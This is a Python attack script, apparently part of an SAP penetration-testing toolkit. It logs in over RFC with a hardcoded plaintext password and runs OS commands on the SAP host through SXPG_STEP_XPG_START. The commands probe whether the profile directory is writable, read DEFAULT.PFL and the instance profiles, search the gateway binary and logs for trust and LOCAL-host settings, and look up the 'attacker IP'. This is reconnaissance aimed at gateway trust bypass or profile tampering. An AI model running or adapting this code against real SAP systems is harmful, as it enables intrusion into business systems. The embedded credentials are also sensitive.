#!/usr/bin/env python3
"""
diag_local_params2.py — Direct-command approach (no bash -c quotes issue).

Key questions:
1. Is DEFAULT.PFL writable by s4hadm?
2. What strings are in gwrd related to local/trust/hostname?
3. Is there a SAP hosttab we can write?
4. What does s4hanadev resolve to (LOCAL IP set)?
"""
import sys
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK    = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST   = '192.168.2.209'
SYSNR  = '00'
CLIENT = '001'
USER   = 'joris'
PASSWD = 'Schaap123!'


def xpg(conn, prog, params, label, long_params=''):
    print(f"\n{'='*60}")
    print(f"[CMD] {label}")
    print(f"  {prog} {params}")
    print('='*60)
    kw = dict(TARGET='', DESTINATION='', EXTPROG=prog, PARAMS=params,
              STDINCNTL='R', STDOUTCNTL='M', STDERRCNTL='M', TRACECNTL='0',
              TERMCNTL='C', TRACELEVEL='0', LONG_PARAMS=long_params, CONNCNTL='H')
    try:
        try:
            r = conn.call('SXPG_STEP_XPG_START', MXROW=9999, **kw)
        except Exception as e:
            if 'MXROW' in str(e) or 'RFC_INVALID_PARAMETER' in str(e):
                r = conn.call('SXPG_STEP_XPG_START', **kw)
            else:
                print(f'  [RFC error] {e}'); return None
    except Exception as e:
        print(f'  [call failed] {e}'); return None

    status = r.get('STATUS', '?')
    log = r.get('LOG', [])
    if not log:
        print(f'  (no output, status={status!r})')
        return None
    lines = []
    for row in log:
        line = (row.get('MESSAGE') or row.get('LINE') or row.get('TEXT') or '').rstrip() \
               if isinstance(row, dict) else str(row).rstrip()
        if line:
            print(f'  {line}')
            lines.append(line)
    print(f'  [status={status!r}]')
    return lines


def main():
    with RFCConnection(sdk_path=SDK, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang='EN') as conn:
        print('[+] RFC connected\n')

        # 1. DEFAULT.PFL permissions (infer writable from ownership)
        xpg(conn, '/bin/ls', '-la /usr/sap/S4H/SYS/profile/DEFAULT.PFL',
            'DEFAULT.PFL owner/permissions')

        # 2. Profile directory listing
        xpg(conn, '/bin/ls', '-la /usr/sap/S4H/SYS/profile/',
            'Profile directory listing')

        # 3. Try to write a test file to the profile directory
        xpg(conn, '/usr/bin/touch', '/usr/sap/S4H/SYS/profile/.write_test',
            'Touch test file in profile dir')
        xpg(conn, '/bin/ls', '-la /usr/sap/S4H/SYS/profile/.write_test',
            'Did the test file get created?')
        xpg(conn, '/bin/rm', '-f /usr/sap/S4H/SYS/profile/.write_test',
            'Clean up test file')

        # 4. getent for s4hanadev (what IPs does GW consider LOCAL)
        xpg(conn, '/usr/bin/getent', 'hosts s4hanadev',
            'getent hosts s4hanadev (= GW LOCAL IPs)')

        # 5. getent for ubuntu/192.168.2.210 (what GW sees as our hostname)
        xpg(conn, '/usr/bin/getent', 'hosts 192.168.2.210',
            'getent hosts 192.168.2.210 (reverse DNS of attacker IP)')

        xpg(conn, '/usr/bin/getent', 'hosts ubuntu',
            'getent hosts ubuntu (forward lookup)')

        # 6. grep gwrd for strings containing "gw/" (parameter namespace)
        #    Using grep -a (treat binary as ASCII text), -o (print match only)
        xpg(conn, '/usr/bin/grep', '-ao gw/sec_info /usr/sap/S4H/D00/exe/gwrd',
            'gwrd binary: does gw/sec_info appear (full string)?')

        # 7. Use strings(1) directly, output goes to STDOUT captured by SXPG
        #    This will be large. Search for "gw/" prefix lines only.
        #    We can't pipe in SXPG, so use strings directly and capture all.
        #    Then we look for interesting lines in the output.
        # Strategy: strings outputs one string per line.
        # To get only gw/* params, use grep -a on gwrd and look for parameter-like strings.

        # Search for ALL occurrences of "gw/" in gwrd binary as text
        xpg(conn, '/usr/bin/grep', '-oa gw/[a-z] /usr/sap/S4H/D00/exe/gwrd',
            'gwrd binary: grep -ao gw/[a-z] (find gw/ parameter starts)')

        # 8. Look for "local" in gwrd binary (as text)
        xpg(conn, '/usr/bin/grep', '-ao local[a-z_]* /usr/sap/S4H/D00/exe/gwrd',
            'gwrd binary: grep local[a-z_]* occurrences')

        # 9. Check for SAP hosttab - SAP's own host resolution file
        xpg(conn, '/usr/bin/find', '/usr/sap/S4H -name hosttab',
            'Find SAP hosttab file (SAP internal host resolver)')

        xpg(conn, '/usr/bin/find', '/usr/sap/S4H/SYS/global -type f',
            'SAP global dir contents (secinfo, reginfo, hosttab, etc)')

        # 10. Check if there's a sapcpic hosttab or NILIST file
        xpg(conn, '/bin/ls', '-la /usr/sap/S4H/SYS/global/',
            'SAP global dir listing')

        # 11. Check gw_log for how GW determines LOCAL IPs
        xpg(conn, '/usr/bin/grep',
            '-n LOCAL /usr/sap/S4H/D00/work/gw_log-2026-04-11',
            'gw_log: lines mentioning LOCAL')

        # 12. Check dev_rd for gw startup LOCAL setup
        xpg(conn, '/usr/bin/grep',
            '-c LOCAL /usr/sap/S4H/D00/work/dev_rd',
            'dev_rd: count of LOCAL mentions')

        # 13. Check if gw/trusted_hosts or gw/local_addr is readable from DEFAULT.PFL
        xpg(conn, '/bin/cat', '/usr/sap/S4H/SYS/profile/DEFAULT.PFL',
            'Current DEFAULT.PFL (check all gw/* params)')

        # 14. Check instance profile for GW-specific settings
        xpg(conn, '/bin/ls', '-la /usr/sap/S4H/SYS/profile/',
            'Profile dir for all profile files')

        # Read S4H_D00 instance profile
        xpg(conn, '/bin/cat', '/usr/sap/S4H/SYS/profile/S4H_D00_s4hanadev',
            'S4H_D00 instance profile (GW params)')

        print('\n[*] Done.')


if __name__ == '__main__':
    main()
